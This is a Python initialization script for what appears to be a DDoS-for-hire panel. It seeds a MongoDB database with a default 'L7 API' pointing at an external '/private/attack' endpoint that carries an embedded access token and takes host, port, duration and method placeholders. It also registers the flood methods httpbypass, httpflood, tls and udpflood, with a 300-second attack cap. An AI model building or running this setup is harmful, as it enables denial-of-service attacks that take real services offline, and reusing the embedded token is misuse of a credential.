"""Script to initialize default data in the database"""
import asyncio
import os
from motor.motor_asyncio import AsyncIOMotorClient
from dotenv import load_dotenv
from pathlib import Path

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

async def init_default_data():
    # MongoDB connection
    mongo_url = os.environ['MONGO_URL']
    client = AsyncIOMotorClient(mongo_url)
    db = client[os.environ['DB_NAME']]
    
    # Check if default API already exists
    existing_api = await db.api_configs.find_one({"name": "Default L7 API"})
    
    if not existing_api:
        # Create default API config
        default_api = {
            "id": "default-l7-api",
            "name": "Default L7 API",
            "url": "https://api.l7srv.su/private/attack?token=SbesnilX8ololuZV8Jvo0k&host=[host]&port=[port]&time=[time]&method=[method]&concs=5",
            "token": "SbesnilX8ololuZV8Jvo0k"
        }
        await db.api_configs.insert_one(default_api)
        print("✓ Default API config created")
    else:
        print("✓ Default API config already exists")
    
    # Check if default methods exist
    default_methods = ["httpbypass", "httpflood", "tls", "udpflood"]
    
    for method_name in default_methods:
        existing_method = await db.methods.find_one({"name": method_name})
        if not existing_method:
            method = {
                "id": f"method-{method_name}",
                "name": method_name,
                "api_ids": ["default-l7-api"]
            }
            await db.methods.insert_one(method)
            print(f"✓ Method '{method_name}' created and linked to default API")
        else:
            # Update to link to default API if not already linked
            if "default-l7-api" not in existing_method.get("api_ids", []):
                await db.methods.update_one(
                    {"name": method_name},
                    {"$addToSet": {"api_ids": "default-l7-api"}}
                )
                print(f"✓ Method '{method_name}' linked to default API")
            else:
                print(f"✓ Method '{method_name}' already exists")
    
    # Set default settings
    existing_settings = await db.settings.find_one({"type": "config"})
    if not existing_settings:
        settings = {
            "type": "config",
            "max_time_allowed": 300
        }
        await db.settings.insert_one(settings)
        print("✓ Default settings created")
    else:
        print("✓ Default settings already exist")
    
    client.close()
    print("\n✓ Database initialization complete!")

if __name__ == "__main__":
    asyncio.run(init_default_data())
